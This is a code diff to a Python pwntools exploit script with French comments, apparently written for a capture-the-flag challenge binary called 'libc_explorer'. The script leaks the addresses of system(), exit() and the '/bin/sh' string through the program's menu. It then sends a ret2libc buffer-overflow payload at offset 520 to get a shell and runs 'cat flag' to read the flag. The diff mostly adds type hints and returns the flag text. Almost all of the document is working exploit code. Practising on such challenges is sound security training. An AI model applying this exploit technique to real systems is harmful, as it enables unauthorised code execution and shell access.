@@ -1,7 +1,7 @@
 from pwn import p32, process, log
 
 
-def get_libc_functions(io):
+def get_libc_functions(io) -> tuple[int, int]:
     # Obtenir l'adresse de system()
     io.sendlineafter(b"Please select an option: ", b"1")
     io.sendlineafter(b"Enter the symbol name to search:", b"system")
@@ -17,7 +17,7 @@ def get_libc_functions(io):
     return system_addr, exit_addr
 
 
-def get_bin_sh_addr(io):
+def get_bin_sh_addr(io) -> int:
     # On cherche la chaîne "/bin/sh" dans libc
     io.sendline(b"2")
     io.sendlineafter(b"Enter the string to search:", b"/bin/sh")
@@ -26,13 +26,14 @@ def get_bin_sh_addr(io):
     return bin_sh_addr
 
 
-def buffer_overflow_ret2libc(binary_path: str, offset: int = 520):
+def buffer_overflow_ret2libc(binary_path: str, offset: int = 520) -> str:
     io = process(binary_path)
 
     system_addr, exit_addr = get_libc_functions(io)
     bin_sh_addr = get_bin_sh_addr(io)
     # Affichage des adresses
     log.info(f"system() = {hex(system_addr)}")
+    log.info(f"exit()   = {hex(exit_addr)}")
     log.info(f"/bin/sh  = {hex(bin_sh_addr)}")
 
     # Création du payload
@@ -42,16 +43,17 @@ def buffer_overflow_ret2libc(binary_path: str, offset: int = 520):
     payload += p32(bin_sh_addr)  # Argument pour system()
 
     # Envoie le choix de menu et le payload
-    io.sendline(b"2")
+    io.sendline(b"1")
+    io.recvuntil(b"Enter the symbol name to search: ")
     io.sendline(payload)
-
-    # On interagit avec le shell pour lire le flag
+    # Envoie la commande dans le shell
     io.sendline(b"cat flag")
-    if b"CECI_EST_LE_FLAG" in io.recvall(timeout=1):
-        return True
+    flag = io.recvall(timeout=2).decode().splitlines()[-1]
+    return flag
 
 
 if __name__ == "__main__":
     binary_path = "./libc_explorer"
     # Offset obtenu avec gdb et la commande cyclic -l
-    buffer_overflow_ret2libc(binary_path, offset=520)
+    flag = buffer_overflow_ret2libc(binary_path, offset=520)
+    print(f"Flag: {flag}")
